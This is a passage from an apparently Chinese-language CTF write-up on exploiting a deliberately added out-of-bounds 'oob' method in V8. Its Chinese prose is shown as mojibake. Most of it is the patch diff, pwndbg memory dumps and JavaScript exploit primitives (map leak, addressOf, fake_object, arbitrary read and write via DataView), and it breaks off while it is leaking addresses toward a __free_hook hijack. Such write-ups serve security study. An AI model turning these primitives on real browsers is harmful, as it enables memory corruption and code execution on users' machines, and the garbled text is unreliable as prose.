b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªé¢˜ç›®å°±åªæœ‰è¿™æ ·ä¸€ä¸ªdiffæ–‡ä»¶ï¼Œè¿™é‡Œä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯ä¸­é—´é‚£ä¸€å—+å·åŒºåŸŸï¼Œåœ¨å‘¨å›´åªæ˜¯ä¸ºäº†èƒ½å¤Ÿæ­£å¸¸è¿›è¡Œç¼–è¯‘æ‰æ·»åŠ çš„ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ·»åŠ çš„è¿™ä¸ªå‡½æ•°åœ¨ä¸€å¼€å§‹å°±å¯¹å‚æ•°çš„æ•°é‡è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå‚æ•°æ•°é‡å¤§äº2åˆ™è¿”å›<code>undefined</code>ï¼Œéšåæ¥å—ç¬¬ä¸€ä¸ªåˆ°<code>receiver</code>ä¸­ï¼Œè¿›ä¸€æ­¥å¾—åˆ°JSArrayç»“æ„çš„å˜é‡arrayï¼Œç´§æ¥ç€é€šè¿‡arrayå˜é‡å–å‡ºå¯¹åº”çš„<code>elements</code>ï¼Œå¹¶ä¸”åœ¨æœ€åæ‹¿åˆ°äº†æ•°ç»„çš„é•¿åº¦ã€‚</p><p>ç„¶åå‡½æ•°åˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå‚æ•°çš„æ•°é‡ä¸º1åˆ™è¿”å›æ•°ç»„æœ«å°¾çš„åä¸€ä¸ªåœ°å€çš„å€¼ï¼Œä¹Ÿå°±å‡ºç°äº†è¶Šç•Œè¯»å–çš„æ¼æ´ã€‚</p><p>å¦‚æœå‚æ•°çš„æ•°é‡ä¸º2åˆ™è·å–ç¬¬äºŒä¸ªå‚æ•°åˆ°<code>value</code>ä¸­ï¼Œç„¶åå†™åˆ°æ•°ç»„æœ«å°¾çš„åä¸€ä¸ªåœ°å€ï¼Œä¹Ÿå°±å‡ºç°äº†è¶Šç•Œå†™çš„æ¼æ´ã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå‡½æ•°å‚æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°é»˜è®¤ä¸ºthisï¼Œæ‰€ä»¥ test_arr.oob() çš„å«ä¹‰ä¸ºä¸€ä¸ªå‚æ•°</strong></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>å…¶å®é€šè¿‡å‰é¢çš„åŸºç¡€çŸ¥è¯†ç« èŠ‚å’Œè¿™é‡Œçš„æ¼æ´åˆ†æä¹‹åå¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥ï¼Œåœ¨æ“ä½œæ•°ç»„ä¸­çš„å†…å®¹æ—¶éƒ½æ˜¯è¿™æ ·ä¸€å±‚ä¸€å±‚æ‰¾ä¸‹å»çš„ã€‚</p><p>è€Œåœ¨jsä¸­å¯¹äºæ•°ç»„ä¸­ä¸æ˜¯åªèƒ½å­˜æ”¾æ•´å‹çš„å˜é‡ï¼Œè¿˜å¯ä»¥å­˜æ”¾å„ç§ç±»å‹çš„å¯¹è±¡ï¼Œè€Œå¦‚ä½•åŒºåˆ†æ•°ç»„ä¸­å˜é‡ç±»å‹å°±éœ€è¦ç”¨åˆ°<code>JSArray</code>ä¸­çš„mapæˆå‘˜è¿›è¡ŒåŒºåˆ†ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹mapæˆå‘˜å³å¯å®ç°ç±»å‹æ··æ·†ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è™½ç„¶æ˜¯æ‰¾åˆ°äº†æ¼æ´ç‚¹ï¼Œå¹¶ä¸”ä¹ŸçŸ¥é“äº†å­˜åœ¨ç±»å‹æ··æ·†çš„å¯èƒ½æ€§ï¼Œä½†æ ¹æ®ç›®å‰çš„æƒ…å†µä»æ— æ³•ç»§ç»­æ“ä½œã€‚å› ä¸ºå¯ä»¥çœ‹åˆ°å‰é¢æˆ‘ä»¬åœ¨çœ‹<code>elements</code>ç»“æ„ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°mapï¼Œä¹Ÿå°±æ— åˆ©ç”¨ä¹‹è°ˆäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8df49</span><br><span class="line">0x11117f8df49: [JSArray]</span><br><span class="line"> - map: 0x07bd46242ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df49-1</span><br><span class="line">00:0000â”‚  0x11117f8df48 â€”â–¸ 0x7bd46242ed9 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df50 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8df58 â€”â–¸ 0x11117f8df21 â—‚â€” 0x20b620c14</span><br><span class="line">03:0018â”‚  0x11117f8df60 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8df68 â€”â–¸ 0x7bd4624ab39 â—‚â€” 0x40000020b620c01</span><br><span class="line">05:0028â”‚  0x11117f8df70 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">06:0030â”‚  0x11117f8df78 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8df80 â—‚â€” 0x100000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8df21-1</span><br><span class="line">00:0000â”‚  0x11117f8df20 â€”â–¸ 0x20b620c14f9 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8df28 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8df30 â—‚â€” 0x3ff199999999999a</span><br><span class="line">03:0018â”‚  0x11117f8df38 â—‚â€” 0x3ff3333333333333</span><br><span class="line">04:0020â”‚  0x11117f8df40 â—‚â€” 0x3ff4cccccccccccd</span><br><span class="line">05:0028â”‚  0x11117f8df48 â€”â–¸ 0x7bd46242ed9 â—‚â€” 0x40000020b620c01</span><br><span class="line">06:0030â”‚  0x11117f8df50 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8df58 â€”â–¸ 0x11117f8df21 â—‚â€” 0x20b620c14</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨åç»­çœ‹æµ®ç‚¹æ•°ä¸­å¯ä»¥çœ‹åˆ°mapçš„åœ°å€ç´§é‚»è€…<code>elements</code>çš„æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8dfe1</span><br><span class="line">0x11117f8dfe1: [JSArray]</span><br><span class="line"> - map: 0x07bd46242f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">         0-2: 0x011117f8df69 &lt;Object map = 0x7bd4624ab39&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfe1-1 20</span><br><span class="line">00:0000â”‚  0x11117f8dfe0 â€”â–¸ 0x7bd46242f79 â—‚â€” 0x40000020b620c01</span><br><span class="line">01:0008â”‚  0x11117f8dfe8 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">02:0010â”‚  0x11117f8dff0 â€”â–¸ 0x11117f8dfb9 â—‚â€” 0x20b620c08</span><br><span class="line">03:0018â”‚  0x11117f8dff8 â—‚â€” 0x300000000</span><br><span class="line">04:0020â”‚  0x11117f8e000 â€”â–¸ 0x7bd46242e89 â—‚â€” 0x40000020b620c01</span><br><span class="line">05:0028â”‚  0x11117f8e008 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">06:0030â”‚  0x11117f8e010 â€”â–¸ 0x11117f8e031 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8e018 â—‚â€” 0x300000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfb9-1</span><br><span class="line">00:0000â”‚  0x11117f8dfb8 â€”â–¸ 0x20b620c0801 â—‚â€” 0x20b620c01</span><br><span class="line">01:0008â”‚  0x11117f8dfc0 â—‚â€” 0x300000000</span><br><span class="line">02:0010â”‚  0x11117f8dfc8 â€”â–¸ 0x11117f8df69 â—‚â€” 0x71000007bd4624ab</span><br><span class="line">... â†“     2 skipped</span><br><span class="line">05:0028â”‚  0x11117f8dfe0 â€”â–¸ 0x7bd46242f79 â—‚â€” 0x40000020b620c01</span><br><span class="line">06:0030â”‚  0x11117f8dfe8 â€”â–¸ 0x20b620c0c71 â—‚â€” 0x20b620c08</span><br><span class="line">07:0038â”‚  0x11117f8dff0 â€”â–¸ 0x11117f8dfb9 â—‚â€” 0x20b620c08</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬åœ¨æ•°ç»„ä¸­å…¨æ˜¯å¯¹è±¡çš„æ—¶å€™ä¹Ÿå¯ä»¥çœ‹åˆ°mapçš„åœ°å€ç´§é‚»ç€è¿™äº›æ•°æ®ã€‚</p><p>æ³¨æ„é‚£ä¸ªåœ°å€çš„æœ€åï¼Œå®ƒçš„å€¼çœ‹èµ·æ¥ä¸æ˜¯å¯¹é½çš„ã€‚è¿™æ˜¯å› ä¸ºv8é‡Œæœ‰ä¸ª<code>tagged pointer</code>æœºåˆ¶ï¼Œä¸€ä¸ªåœ°å€æŒ‡å‘çš„å¦‚æœä¸æ˜¯SMIï¼ˆå°±æ˜¯å°æ•´æ•°)ï¼Œå®ƒçš„æœ€ä½ä½å°±ä¼šæ‰“ä¸Šä¸€ä¸ªæ ‡è®°ï¼Œå°±ä¼šæœ‰ä¸ª1ï¼Œçœ‹èµ·æ¥å°±ä¸æ˜¯å¯¹é½çš„ï¼Œç”¨çš„æ—¶å€™è¦å‡1ã€‚</p><p>æ¥ç€éœ€è¦æ€è€ƒçš„äº‹ï¼Œä¸€ä¸ªè¶Šç•Œè¯»å†™èƒ½ç»™æˆ‘é€ æˆä»€ä¹ˆæ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p><h4 id="1-æ³„æ¼mapåœ°å€"><a href="#1-æ³„æ¼mapåœ°å€" class="headerlink" title="1. æ³„æ¼mapåœ°å€"></a><strong>1. æ³„æ¼mapåœ°å€</strong></h4><p>è¿™é‡Œæ³„æ¼mapåœ°å€å°±å¾ˆç®€å•ï¼Œåœ¨æ•°ç»„ä¸­çš„æˆå‘˜ä¸ºå¯¹è±¡å’Œæµ®ç‚¹å‹çš„æ—¶å€™ç›´æ¥è°ƒç”¨oobå‡½æ•°å³å¯è·å–åˆ°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><h4 id="2-ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€"><a href="#2-ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€" class="headerlink" title="2. ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€"></a><strong>2. ç±»å‹æ··æ·†è·å–ä»»æ„å¯¹è±¡åœ°å€</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">  obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">  obj_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">  obj_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å®ç°åŸç†ä¹Ÿæ˜¯éå¸¸ç®€å•ï¼Œé¦–å…ˆå°±æ˜¯å°†éœ€è¦è·å–åœ°å€çš„å¯¹è±¡æ”¾åˆ°<code>obj_array</code>ä¸­ï¼Œéšåä½¿ç”¨<code>oob</code>å‡½æ•°å°†<code>flt_array_map</code>çš„åœ°å€å†™è¿›å»ï¼Œè¿™æ—¶å†å»è®¿é—®<code>obj_array</code>ä¸­çš„æˆå‘˜æ—¶å°±ä¼šä»¥floatçš„å½¢å¼è¿”å›å‡ºå¯¹åº”çš„åœ°å€äº†ï¼Œæœ€ååœ¨æ¢å¤ç±»å‹å³å¯ã€‚</p><h4 id="3-è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡"><a href="#3-è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡" class="headerlink" title="3. è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡"></a><strong>3. è®²ä»»æ„åœ°å€å½“ä½œå¯¹è±¡</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">  flt_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">  flt_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é“ç†å’Œä¸Šä¸€æ­¥ç±»ä¼¼ã€‚</p><h4 id="4-å®ç°ä»»æ„åœ°å€è¯»å–"><a href="#4-å®ç°ä»»æ„åœ°å€è¯»å–" class="headerlink" title="4. å®ç°ä»»æ„åœ°å€è¯»å–"></a><strong>4. å®ç°ä»»æ„åœ°å€è¯»å–</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">  <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œæ˜¯å§<code>arb_rw_arr</code>è¿™ä¸ªæ•°ç»„çš„<code>elements</code>åŒºåŸŸå½“ä½œçš„æ˜¯ä¸€ä¸ª<code>JSArray</code>ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„å¯¹åº”çš„æŒ‡é’ˆä¸º<code>fake_obj</code>ã€‚</p><p>è¿™é‡Œä¸»è¦è§£é‡Šä¸€ä¸‹ç¬¬äºŒè¡Œä»£ç è°ƒç”¨å‡½æ•°çš„éƒ¨åˆ†ï¼Œè¿™é‡Œé¦–å…ˆæ˜¯æ‹¿åˆ°<code>arb_rw_arr</code>å¯¹è±¡çš„åœ°å€ï¼Œéšåå‡å»<code>0x20</code>åˆ™æ˜¯å› ä¸º<code>JSArray</code>å’Œ<code>elements</code>ç›¸è·å›ºå®šåç§»ä¸º<code>0x30</code>ï¼Œè¿™é‡Œå‡å»0x20çš„è¯ä»£è¡¨å°†<code>elements + 0x10</code>å½“åšäº†<code>fake JSArray</code>ï¼Œæ ¹æ®å‰é¢çš„è°ƒè¯•å¾—çŸ¥åœ¨<code>elements + 0x10</code>çš„ä½ç½®å¼€å§‹ä¸ºæ•°ç»„ä¸­æ•°æ®çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ˜¯å¯ä»¥å®ç°ä»»æ„ä¿®æ”¹<code>fake_obj</code>çš„<code>JSArray</code>éƒ¨åˆ†ã€‚</p><p>ç„¶åå°±æ˜¯è¿™é‡Œè¿”å›çš„<code>fake_obj</code>å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å®è´¨æŒ‡å‘çš„æ˜¯å°±æ˜¯<code>arb_rw_arr</code>çš„<code>elements + 0x10</code>çš„ä½ç½®ã€‚</p><p>åˆå› ä¸ºå¯ä»¥ä»»æ„ä¿®æ”¹è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>elements</code>æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ä»»æ„åœ°å€é…åˆ<code>fake_obj</code>å¯¹è±¡å³å¯è¾¾åˆ°ä»»æ„åœ°å€è¯»å–çš„æ•ˆæœã€‚</p><h4 id="5-å®ç°ä»»æ„åœ°å€å†™"><a href="#5-å®ç°ä»»æ„åœ°å€å†™" class="headerlink" title="5. å®ç°ä»»æ„åœ°å€å†™"></a><strong>5. å®ç°ä»»æ„åœ°å€å†™</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = address;</span><br><span class="line">  data_view.setFloat64(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»»æ„åœ°å€å†™çš„å†™æ³•åœ¨ä¸€å¼€å§‹çš„æƒ³æ³•è‚¯å®šæ˜¯å’Œä»»æ„åœ°å€è¯»ä¸€è‡´ã€‚ä¸è¿‡æŒ‰ç…§ä¸Šé¢é‚£æ ·å†™ä¼šå‡ºç°ä¸€ä¸ªæ®µé”™è¯¯ï¼Œè¿™æ˜¯ç®€å•çš„<code>write FloatArray</code>å¯¹æµ®ç‚¹æ•°çš„å¤„ç†æ–¹å¼é€ æˆçš„ï¼Œå½“å€¼ä»¥ 0x7f å¼€å¤´ç­‰é«˜å¤„çš„åœ°å€éƒ½ä¼šå‡ºç°è¿™ç§é—®é¢˜ã€‚ä¸ºäº†é¿å…é€‰æ‹©ä½¿ç”¨<code>DataView</code>æ¥å¤„ç†ã€‚</p><p><code>DataView</code>å¯¹è±¡åç§»<code>+0x20</code>å¤„ï¼Œå­˜æœ‰ä¸€ä¸ª<code>backing_store</code>æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘çœŸæ­£å­˜å‚¨æ•°æ®çš„åœ°å€ï¼Œæ”¹å†™è¿™ä¸ªæŒ‡é’ˆå³å¯ä»»æ„è¯»å†™ã€‚</p><h4 id="æœ€ç»ˆåˆ©ç”¨-ä¼ ç»Ÿæ–¹å¼"><a href="#æœ€ç»ˆåˆ©ç”¨-ä¼ ç»Ÿæ–¹å¼" class="headerlink" title="æœ€ç»ˆåˆ©ç”¨: ä¼ ç»Ÿæ–¹å¼"></a><strong>æœ€ç»ˆåˆ©ç”¨: ä¼ ç»Ÿæ–¹å¼</strong></h4><p>ä¼ ç»Ÿçš„æ–¹å¼æ˜¯å¯¹<code>__free_hook</code>è¿›è¡ŒåŠ«æŒã€‚ä½†æ˜¯å®ƒåœ¨libcä¸­ï¼Œæ‰€ä»¥é¦–å…ˆè¿˜æ˜¯éœ€è¦è€ƒè™‘æ³„æ¼å‡ºç¨‹åºåŸºåœ°å€ï¼Œç„¶åé€šè¿‡gotè¡¨æ³„æ¼å‡ºlibcåœ°å€ã€‚</p><p>ä¸è¿‡ç›®å‰é‡åˆ°çš„æ˜¯å¦‚ä½•æ³„æ¼å‡ºç¨‹åºåŸºåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0fcdcb2c2d99</span><br><span class="line">0xfcdcb2c2d99: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x046dfe5804d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x1bc536f80609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x08ad62ed1f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x08ad62ed1e59 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x046dfe584ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x0fcdcb2c2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x08ad62ed0ec1 &lt;JSFunction Array (sfi = 0x1bc536f86791)&gt;</span><br><span class="line"> - dependent code: 0x046dfe5802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéšä¾¿æŸ¥çœ‹ä¸€ä¸ª<code>JSArray</code>å†…éƒ¨çš„mapï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­åŒ…å«è¿™<code>constructor</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x08ad62ed0ec1</span><br><span class="line">0x8ad62ed0ec1: [Function] in OldSpace</span><br><span class="line"> - map: 0x0fcdcb2c2d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x08ad62ec2109 &lt;JSFunction (sfi = 0x1bc536f83b29)&gt;</span><br><span class="line"> - elements: 0x046dfe580c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: 0x0fcdcb2c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: 0x1bc536f86791 &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: 0x046dfe583599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: 65535</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x08ad62ec1869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3eadb8bc6981 &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: 0x08ad62ed1029 &lt;PropertyArray[6]&gt; &#123;</span><br><span class="line">    #length: 0x1bc536f804b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x1bc536f80449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x1bc536f80529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    0x046dfe584c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) 